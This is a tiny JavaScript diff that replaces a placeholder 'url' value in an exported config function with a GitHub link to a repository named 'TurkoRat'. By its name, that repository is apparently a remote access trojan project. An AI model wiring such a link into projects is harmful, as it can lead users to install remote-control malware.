@@ -1,5 +1,6 @@
 module.exports = (client) => {
     return {
-        url: "REPLACE_ME",
+        url: "https://github.com/AliTefeli02/TurkoRat.git",
     }
 }
+
